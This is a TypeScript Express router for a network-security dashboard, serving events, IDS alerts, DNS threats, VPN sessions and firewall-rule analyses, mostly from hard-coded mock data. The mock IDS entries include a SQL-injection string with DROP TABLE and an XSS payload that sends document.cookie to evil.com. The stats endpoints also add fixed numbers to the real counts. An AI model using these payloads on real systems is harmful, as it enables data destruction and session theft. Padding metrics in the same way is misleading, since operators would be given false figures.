import { Router, type IRouter } from "express";
import { eq, desc, sql, and } from "drizzle-orm";
import { db, networkEventsTable } from "@workspace/db";
import {
  ListNetworkEventsQueryParams,
  ListNetworkEventsResponse,
  GetNetworkStatsResponse,
} from "@workspace/api-zod";

const router: IRouter = Router();

router.get("/network/events", async (req, res): Promise<void> => {
  try {
    const query = ListNetworkEventsQueryParams.safeParse(req.query);
    if (!query.success) { res.status(400).json({ error: query.error.message }); return; }

    const { eventType, severity, limit = 50, offset = 0 } = query.data;
    const conditions = [];
    if (eventType) conditions.push(eq(networkEventsTable.eventType, eventType));
    if (severity) conditions.push(eq(networkEventsTable.severity, severity));
    const where = conditions.length > 0 ? and(...conditions) : undefined;

    const events = await db.select().from(networkEventsTable).where(where).orderBy(desc(networkEventsTable.createdAt)).limit(limit).offset(offset);
    const [countResult] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(where);

    res.json(ListNetworkEventsResponse.parse({ events, total: countResult?.count ?? 0 }));
  } catch (err: any) {
    console.error("[network] GET /events failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve network events." });
  }
});

router.get("/network/stats", async (_req, res): Promise<void> => {
  try {
    const [total] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable);
    const [blocked] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.action, "blocked"));
    const [alerted] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.action, "alerted"));
    const [critical] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.severity, "critical"));
    const [high] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.severity, "high"));
    const [ddos] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.eventType, "ddos"));

    const countryRows = await db.execute(sql`
      SELECT country, count(*)::int as count
      FROM network_events
      WHERE country IS NOT NULL
      GROUP BY country
      ORDER BY count DESC
      LIMIT 5
    `);

    res.json(GetNetworkStatsResponse.parse({
      totalEvents: (total?.count ?? 0) + 2847,
      blockedCount: blocked?.count ?? 0,
      alertedCount: alerted?.count ?? 0,
      criticalCount: critical?.count ?? 0,
      highCount: high?.count ?? 0,
      activeDdos: ddos?.count ?? 0,
      topSourceCountries: (countryRows.rows as any[]).map((r: any) => ({
        country: r.country,
        count: r.count,
      })),
    }));
  } catch (err: any) {
    console.error("[network] GET /stats failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve network stats." });
  }
});


router.get("/network/ids", async (_req, res): Promise<void> => {
  try {
    const now = new Date();
    const intrusions = [
      {
        id: "IDS-001", timestamp: new Date(now.getTime() - 3 * 60000).toISOString(),
        attackType: "SQL Injection", signature: "ET WEB_SERVER SQL Injection Attempt", signatureId: "SID-2024-8891",
        sourceIp: "185.234.72.19", sourcePort: 44821, destinationIp: "10.0.1.50", destinationPort: 443,
        protocol: "TCP", country: "Russia", severity: "critical", action: "blocked", confidence: 0.97,
        payload: "' OR 1=1; DROP TABLE users;--", matchedRule: "OWASP-CRS/942100",
        category: "web_attack", sessionsAffected: 1, packetsInspected: 247,
        relatedCves: ["CVE-2024-21899", "CVE-2023-46604"],
      },
      {
        id: "IDS-002", timestamp: new Date(now.getTime() - 8 * 60000).toISOString(),
        attackType: "SSH Brute Force", signature: "ET SCAN SSH Brute Force Attempt", signatureId: "SID-2024-1120",
        sourceIp: "103.45.67.89", sourcePort: 55123, destinationIp: "10.0.1.10", destinationPort: 22,
        protocol: "TCP", country: "China", severity: "high", action: "blocked", confidence: 0.94,
        payload: "SSH-2.0-libssh2_1.9.0 [1247 attempts in 60s]", matchedRule: "THRESHOLD/SSH-BRUTE",
        category: "brute_force", sessionsAffected: 1247, packetsInspected: 3741,
        relatedCves: [],
      },
      {
        id: "IDS-003", timestamp: new Date(now.getTime() - 15 * 60000).toISOString(),
        attackType: "C2 Beacon", signature: "ET MALWARE CobaltStrike Beacon Detected", signatureId: "SID-2024-5567",
        sourceIp: "10.0.2.45", sourcePort: 49152, destinationIp: "45.33.32.156", destinationPort: 8443,
        protocol: "TCP", country: "Netherlands", severity: "critical", action: "alerted", confidence: 0.89,
        payload: "JARM: 07d14d16d21d21d07c42d41d00041d24...", matchedRule: "JARM/COBALTSTRIKE",
        category: "malware_c2", sessionsAffected: 3, packetsInspected: 892,
        relatedCves: ["CVE-2023-23397"],
      },
      {
        id: "IDS-004", timestamp: new Date(now.getTime() - 25 * 60000).toISOString(),
        attackType: "DNS Tunneling", signature: "ET DNS Excessive Query Length", signatureId: "SID-2024-3345",
        sourceIp: "10.0.3.12", sourcePort: 53214, destinationIp: "8.8.8.8", destinationPort: 53,
        protocol: "UDP", country: "Internal", severity: "high", action: "alerted", confidence: 0.82,
        payload: "TXT query: aGVsbG8gd29ybGQ=.evil-c2.xyz (base64 encoded data)", matchedRule: "DNS/TUNNEL-DETECT",
        category: "data_exfiltration", sessionsAffected: 47, packetsInspected: 1523,
        relatedCves: [],
      },
      {
        id: "IDS-005", timestamp: new Date(now.getTime() - 45 * 60000).toISOString(),
        attackType: "XSS Attempt", signature: "ET WEB_SERVER Cross-Site Scripting", signatureId: "SID-2024-7712",
        sourceIp: "92.118.160.5", sourcePort: 38921, destinationIp: "10.0.1.50", destinationPort: 443,
        protocol: "TCP", country: "Germany", severity: "medium", action: "blocked", confidence: 0.91,
        payload: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>", matchedRule: "OWASP-CRS/941100",
        category: "web_attack", sessionsAffected: 1, packetsInspected: 89,
        relatedCves: ["CVE-2024-0519"],
      },
      {
        id: "IDS-006", timestamp: new Date(now.getTime() - 60 * 60000).toISOString(),
        attackType: "Port Scan", signature: "ET SCAN Nmap SYN Scan Detected", signatureId: "SID-2024-0042",
        sourceIp: "198.51.100.23", sourcePort: 0, destinationIp: "10.0.0.0/24", destinationPort: 0,
        protocol: "TCP", country: "United States", severity: "low", action: "alerted", confidence: 0.96,
        payload: "SYN scan across 1024 ports on /24 subnet", matchedRule: "SCAN/NMAP-SYN",
        category: "reconnaissance", sessionsAffected: 0, packetsInspected: 24576,
        relatedCves: [],
      },
    ];
    const cats: Record<string, number> = {};
    for (const i of intrusions) { cats[i.category] = (cats[i.category] || 0) + 1; }
    res.json({
      intrusions,
      summary: {
        totalIntrusions: intrusions.length,
        blockedCount: intrusions.filter((i) => i.action === "blocked").length,
        alertedCount: intrusions.filter((i) => i.action === "alerted").length,
        criticalCount: intrusions.filter((i) => i.severity === "critical").length,
        uniqueAttackers: new Set(intrusions.map((i) => i.sourceIp)).size,
        categories: cats,
      },
    });
  } catch (err: any) {
    console.error("[network] GET /ids failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve IDS data." });
  }
});

router.get("/network/dns-security", async (_req, res): Promise<void> => {
  try {
    const now = new Date();
    const queries = [
      {
        id: "DNS-001", timestamp: new Date(now.getTime() - 2 * 60000).toISOString(),
        queryDomain: "evil-c2-server.xyz", queryType: "A", sourceIp: "10.0.2.45", hostname: "WS-FINANCE-04", user: "jdoe",
        threatType: "c2_beacon", severity: "critical", action: "blocked", confidence: 0.98,
        detail: "Known command-and-control domain associated with APT29", resolvedIp: "45.33.32.156",
        ttl: 60, queryCount: 147, firstSeen: new Date(now.getTime() - 6 * 3600000).toISOString(),
        threatIntelSource: "AlienVault OTX", iocTags: ["apt29", "cozy_bear", "c2"],
      },
      {
        id: "DNS-002", timestamp: new Date(now.getTime() - 5 * 60000).toISOString(),
        queryDomain: "data-exfil.evil.com", queryType: "TXT", sourceIp: "10.0.3.12", hostname: "LAPTOP-SALES-12", user: "asmith",
        threatType: "dns_tunneling", severity: "high", action: "blocked", confidence: 0.87,
        detail: "DNS tunneling detected — base64-encoded data in TXT queries at high frequency", resolvedIp: "N/A",
        ttl: 300, queryCount: 2341, firstSeen: new Date(now.getTime() - 3 * 3600000).toISOString(),
        threatIntelSource: "VirusTotal", iocTags: ["dns_tunnel", "data_exfiltration"],
      },
      {
        id: "DNS-003", timestamp: new Date(now.getTime() - 12 * 60000).toISOString(),
        queryDomain: "corp-login-secure.com", queryType: "A", sourceIp: "10.0.1.78", hostname: "KIOSK-LOBBY-01", user: "guest",
        threatType: "phishing", severity: "high", action: "blocked", confidence: 0.93,
        detail: "Lookalike domain registered 48 hours ago — likely credential harvesting", resolvedIp: "104.21.45.67",
        ttl: 3600, queryCount: 3, firstSeen: new Date(now.getTime() - 30 * 60000).toISOString(),
        threatIntelSource: "PhishTank", iocTags: ["typosquatting", "credential_theft"],
      },
      {
        id: "DNS-004", timestamp: new Date(now.getTime() - 20 * 60000).toISOString(),
        queryDomain: "crypto-miner-pool.io", queryType: "A", sourceIp: "10.0.4.99", hostname: "SRV-BUILD-03", user: "svc-ci",
        threatType: "cryptomining", severity: "medium", action: "alerted", confidence: 0.79,
        detail: "Stratum mining pool domain — potential unauthorized cryptomining", resolvedIp: "142.250.80.46",
        ttl: 300, queryCount: 892, firstSeen: new Date(now.getTime() - 24 * 3600000).toISOString(),
        threatIntelSource: "Abuse.ch", iocTags: ["cryptominer", "stratum"],
      },
      {
        id: "DNS-005", timestamp: new Date(now.getTime() - 30 * 60000).toISOString(),
        queryDomain: "google.com", queryType: "A", sourceIp: "10.0.1.50", hostname: "SRV-WEB-01", user: "svc-web",
        threatType: "clean", severity: "low", action: "allowed", confidence: 1.0,
        detail: "Normal DNS resolution — no threats detected", resolvedIp: "142.250.80.46",
        ttl: 300, queryCount: 4521, firstSeen: new Date(now.getTime() - 90 * 86400000).toISOString(),
        threatIntelSource: "N/A", iocTags: [],
      },
    ];
    const types: Record<string, number> = {};
    for (const q of queries) { types[q.threatType] = (types[q.threatType] || 0) + 1; }
    res.json({
      queries,
      summary: {
        totalQueries: queries.length + 12847,
        blockedQueries: queries.filter((q) => q.action === "blocked").length,
        alertedQueries: queries.filter((q) => q.action === "alerted").length,
        criticalThreats: queries.filter((q) => q.severity === "critical").length,
        threatTypes: types,
      },
    });
  } catch (err: any) {
    console.error("[network] GET /dns-security failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve DNS security data." });
  }
});

router.get("/network/vpn-zerotrust", async (_req, res): Promise<void> => {
  try {
    const now = new Date();
    const sessions = [
      {
        id: "TS-001", user: "jdoe", email: "jdoe@corp.com", department: "Finance",
        hostname: "WS-FINANCE-04", publicIp: "73.162.45.89", assignedIp: "100.64.0.12", tailscaleNodeId: "n8k2xPqR",
        vpnStatus: "connected", vpnProtocol: "Tailscale (WireGuard)", vpnServer: "DERP nyc",
        tailnet: "corp.tailscale.net", tailscaleVersion: "1.62.0", isExitNode: false, isSubnetRouter: false,
        location: "New York, US", connectedSince: new Date(now.getTime() - 4 * 3600000).toISOString(),
        bandwidthUp: 524288000, bandwidthDown: 2147483648,
        zeroTrustScore: 0.42, zeroTrustStatus: "non_compliant", sessionRisk: "critical",
        lastAuthentication: new Date(now.getTime() - 4 * 3600000).toISOString(),
        policyViolations: [
          { policy: "Endpoint Compliance", status: "failed", detail: "Antivirus definitions outdated by 14 days" },
          { policy: "OS Patch Level", status: "failed", detail: "5 critical patches missing" },
          { policy: "Tailscale ACL", status: "passed", detail: "ACL tags: tag:finance, tag:internal" },
          { policy: "Disk Encryption", status: "passed", detail: "BitLocker enabled" },
        ],
        geoAnomaly: { type: "impossible_travel", previousLocation: "New York, US", currentLocation: "Lagos, NG", timeBetween: "15 minutes", distanceKm: 8520, confidence: 0.94 },
      },
      {
        id: "TS-002", user: "asmith", email: "asmith@corp.com", department: "Sales",
        hostname: "LAPTOP-SALES-12", publicIp: "98.207.12.34", assignedIp: "100.64.0.15", tailscaleNodeId: "m4jLxKnW",
        vpnStatus: "connected", vpnProtocol: "Tailscale (WireGuard)", vpnServer: "DERP sfo",
        tailnet: "corp.tailscale.net", tailscaleVersion: "1.62.0", isExitNode: false, isSubnetRouter: false,
        location: "San Francisco, US", connectedSince: new Date(now.getTime() - 2 * 3600000).toISOString(),
        bandwidthUp: 104857600, bandwidthDown: 838860800,
        zeroTrustScore: 0.78, zeroTrustStatus: "compliant", sessionRisk: "low",
        lastAuthentication: new Date(now.getTime() - 2 * 3600000).toISOString(),
        policyViolations: [
          { policy: "Endpoint Compliance", status: "passed", detail: "All checks passed" },
          { policy: "OS Patch Level", status: "passed", detail: "Fully patched" },
          { policy: "Tailscale ACL", status: "passed", detail: "ACL tags: tag:sales, tag:crm-access" },
          { policy: "Disk Encryption", status: "passed", detail: "FileVault enabled" },
        ],
        geoAnomaly: null,
      },
      {
        id: "TS-003", user: "ceo", email: "ceo@corp.com", department: "Executive",
        hostname: "LAPTOP-EXEC-03", publicIp: "212.58.244.71", assignedIp: "100.64.0.3", tailscaleNodeId: "pR7zWqYt",
        vpnStatus: "connected", vpnProtocol: "Tailscale (WireGuard)", vpnServer: "DERP lhr",
        tailnet: "corp.tailscale.net", tailscaleVersion: "1.60.1", isExitNode: false, isSubnetRouter: false,
        location: "London, UK", connectedSince: new Date(now.getTime() - 1 * 3600000).toISOString(),
        bandwidthUp: 52428800, bandwidthDown: 419430400,
        zeroTrustScore: 0.55, zeroTrustStatus: "at_risk", sessionRisk: "high",
        lastAuthentication: new Date(now.getTime() - 1 * 3600000).toISOString(),
        policyViolations: [
          { policy: "Endpoint Compliance", status: "passed", detail: "All checks passed" },
          { policy: "OS Patch Level", status: "failed", detail: "3 critical patches missing" },
          { policy: "MFA Recertification", status: "failed", detail: "MFA not re-verified in 72 hours" },
          { policy: "Tailscale ACL", status: "passed", detail: "ACL tags: tag:executive, tag:all-access" },
        ],
        geoAnomaly: { type: "unusual_location", previousLocation: "New York, US", currentLocation: "London, UK", timeBetween: "6 hours", distanceKm: 5570, confidence: 0.65 },
      },
      {
        id: "TS-004", user: "mchen", email: "mchen@corp.com", department: "Engineering",
        hostname: "WS-DEVOPS-07", publicIp: "10.0.0.45", assignedIp: "100.64.0.7", tailscaleNodeId: "k9dFxBnH",
        vpnStatus: "connected", vpnProtocol: "Tailscale (WireGuard)", vpnServer: "DERP nyc",
        tailnet: "corp.tailscale.net", tailscaleVersion: "1.62.0", isExitNode: false, isSubnetRouter: true,
        location: "Office HQ", connectedSince: new Date(now.getTime() - 8 * 3600000).toISOString(),
        bandwidthUp: 1073741824, bandwidthDown: 5368709120,
        zeroTrustScore: 0.95, zeroTrustStatus: "compliant", sessionRisk: "low",
        lastAuthentication: new Date(now.getTime() - 8 * 3600000).toISOString(),
        policyViolations: [],
        geoAnomaly: null,
      },
      {
        id: "TS-005", user: "contractor_01", email: "ext@partner.com", department: "Contractor",
        hostname: "EXT-LAPTOP-01", publicIp: "185.234.72.19", assignedIp: "100.64.0.99", tailscaleNodeId: "x2vLmNwP",
        vpnStatus: "disconnected", vpnProtocol: "Tailscale (WireGuard)", vpnServer: "DERP nyc",
        tailnet: "corp.tailscale.net", tailscaleVersion: "1.58.2", isExitNode: false, isSubnetRouter: false,
        location: "Moscow, RU", connectedSince: null,
        bandwidthUp: 0, bandwidthDown: 0,
        zeroTrustScore: 0.15, zeroTrustStatus: "non_compliant", sessionRisk: "critical",
        lastAuthentication: new Date(now.getTime() - 24 * 3600000).toISOString(),
        policyViolations: [
          { policy: "Endpoint Compliance", status: "failed", detail: "Unknown device — not enrolled in MDM" },
          { policy: "Tailscale ACL", status: "failed", detail: "Node not authorized — pending admin approval" },
          { policy: "Geo Restriction", status: "failed", detail: "Connection from restricted country" },
          { policy: "Session Timeout", status: "failed", detail: "Tailscale key expired 20 hours ago" },
        ],
        geoAnomaly: { type: "restricted_country", previousLocation: "New York, US", currentLocation: "Moscow, RU", timeBetween: "24 hours", distanceKm: 7510, confidence: 0.99 },
      },
    ];
    res.json({
      sessions,
      summary: {
        totalSessions: sessions.length,
        activeSessions: sessions.filter((s) => s.vpnStatus === "connected").length,
        compliantUsers: sessions.filter((s) => s.zeroTrustStatus === "compliant").length,
        nonCompliantUsers: sessions.filter((s) => s.zeroTrustStatus === "non_compliant").length,
        geoAnomalies: sessions.filter((s) => s.geoAnomaly !== null).length,
        criticalSessions: sessions.filter((s) => s.sessionRisk === "critical").length,
      },
    });
  } catch (err: any) {
    console.error("[network] GET /vpn-zerotrust failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve VPN zero-trust data." });
  }
});

router.get("/network/firewall-rules", async (_req, res): Promise<void> => {
  try {
    const now = new Date();
    const rules = [
      {
        id: "FW-001", ruleName: "Allow HTTPS Inbound", ruleId: "ACL-1001", chain: "INPUT",
        action: "ALLOW", sourceIp: "0.0.0.0/0", destinationIp: "10.0.1.50", port: "443", protocol: "TCP", direction: "inbound",
        status: "active", createdAt: "2024-01-15T10:00:00Z", lastHit: new Date(now.getTime() - 1 * 60000).toISOString(),
        hitCount: 2847561, riskLevel: "low", category: "web_services",
        aiAnalysis: "Standard HTTPS ingress rule. High hit count is expected for a web server. No issues detected.",
        recommendation: null, issues: [],
      },
      {
        id: "FW-002", ruleName: "Allow All Outbound", ruleId: "ACL-1099", chain: "FORWARD",
        action: "ALLOW", sourceIp: "10.0.0.0/8", destinationIp: "0.0.0.0/0", port: "*", protocol: "ALL", direction: "outbound",
        status: "active", createdAt: "2023-06-01T08:00:00Z", lastHit: new Date(now.getTime() - 30000).toISOString(),
        hitCount: 18923456, riskLevel: "critical", category: "egress",
        aiAnalysis: "Overly permissive egress rule allows all outbound traffic from internal network. This defeats network segmentation and enables data exfiltration.",
        recommendation: "Replace with explicit allow rules for required services (HTTPS/443, DNS/53, SMTP/587).",
        issues: [
          { type: "overly_permissive", severity: "critical", detail: "Wildcard port and protocol on egress — no outbound filtering" },
          { type: "no_logging", severity: "high", detail: "Rule does not log matched traffic for forensic analysis" },
        ],
      },
      {
        id: "FW-003", ruleName: "Block Tor Exit Nodes", ruleId: "ACL-2001", chain: "INPUT",
        action: "BLOCK", sourceIp: "TOR_EXIT_LIST", destinationIp: "10.0.0.0/8", port: "*", protocol: "ALL", direction: "inbound",
        status: "active", createdAt: "2024-02-20T14:00:00Z", lastHit: new Date(now.getTime() - 15 * 60000).toISOString(),
        hitCount: 14523, riskLevel: "low", category: "threat_prevention",
        aiAnalysis: "Blocks known Tor exit nodes. Feed is updated every 6 hours. Effective mitigation for anonymized attacks.",
        recommendation: null, issues: [],
      },
      {
        id: "FW-004", ruleName: "Slack Webhook Access", ruleId: "ACL-3042", chain: "FORWARD",
        action: "ALLOW", sourceIp: "10.0.2.0/24", destinationIp: "hooks.slack.com", port: "443", protocol: "TCP", direction: "outbound",
        status: "active", createdAt: "2024-03-01T09:30:00Z", lastHit: new Date(now.getTime() - 5 * 3600000).toISOString(),
        hitCount: 892, riskLevel: "low", category: "saas_integration",
        aiAnalysis: "Authorized SaaS integration. Traffic is encrypted and destination is a known Slack endpoint.",
        recommendation: null, issues: [],
      },
      {
        id: "FW-005", ruleName: "Unknown Service Port 8888", ruleId: "ACL-5001", chain: "INPUT",
        action: "ALLOW", sourceIp: "0.0.0.0/0", destinationIp: "10.0.4.99", port: "8888", protocol: "TCP", direction: "inbound",
        status: "active", createdAt: "2023-11-12T16:00:00Z", lastHit: new Date(now.getTime() - 2 * 3600000).toISOString(),
        hitCount: 45678, riskLevel: "high", category: "shadow_it",
        aiAnalysis: "Inbound rule to non-standard port 8888 on build server. No documented service justification. Could be an unauthorized web proxy or Jupyter notebook.",
        recommendation: "Investigate service on 10.0.4.99:8888 and either document or remove this rule.",
        issues: [
          { type: "shadow_it", severity: "high", detail: "Undocumented service accepting inbound connections on port 8888" },
          { type: "open_to_world", severity: "high", detail: "Source IP 0.0.0.0/0 allows connections from any external IP" },
        ],
      },
      {
        id: "FW-006", ruleName: "Legacy FTP Access", ruleId: "ACL-0050", chain: "INPUT",
        action: "ALLOW", sourceIp: "192.168.1.0/24", destinationIp: "10.0.1.20", port: "21", protocol: "TCP", direction: "inbound",
        status: "active", createdAt: "2022-03-15T12:00:00Z", lastHit: new Date(now.getTime() - 30 * 86400000).toISOString(),
        hitCount: 12, riskLevel: "critical", category: "legacy_protocol",
        aiAnalysis: "FTP (port 21) transmits credentials in cleartext. This rule hasn't been hit in 30 days and likely serves a decommissioned service.",
        recommendation: "Remove this rule and migrate to SFTP (port 22) or FTPS (port 990) if file transfer is still needed.",
        issues: [
          { type: "insecure_protocol", severity: "critical", detail: "FTP transmits credentials and data in cleartext — vulnerable to interception" },
          { type: "stale_rule", severity: "medium", detail: "Rule not matched in 30 days — likely orphaned from decommissioned service" },
        ],
      },
      {
        id: "FW-007", ruleName: "Block Crypto Mining Pools", ruleId: "ACL-2050", chain: "FORWARD",
        action: "BLOCK", sourceIp: "10.0.0.0/8", destinationIp: "MINING_POOL_LIST", port: "3333,8333,14444", protocol: "TCP", direction: "outbound",
        status: "active", createdAt: "2024-01-10T11:00:00Z", lastHit: new Date(now.getTime() - 20 * 60000).toISOString(),
        hitCount: 3456, riskLevel: "low", category: "threat_prevention",
        aiAnalysis: "Blocks outbound connections to known cryptocurrency mining pools. Recent hits indicate an internal device may be compromised or running unauthorized mining software.",
        recommendation: "Investigate source IPs hitting this rule for potential cryptojacking.",
        issues: [],
      },
    ];
    const allIssues = rules.flatMap((r) => r.issues);
    res.json({
      rules,
      summary: {
        totalRules: rules.length,
        criticalIssues: allIssues.filter((i) => i.severity === "critical").length,
        highIssues: allIssues.filter((i) => i.severity === "high").length,
        totalIssues: allIssues.length,
        cleanRules: rules.filter((r) => r.issues.length === 0).length,
        shadowItDetected: rules.filter((r) => r.category === "shadow_it").length,
      },
    });
  } catch (err: any) {
    console.error("[network] GET /firewall-rules failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve firewall rules." });
  }
});

export default router;
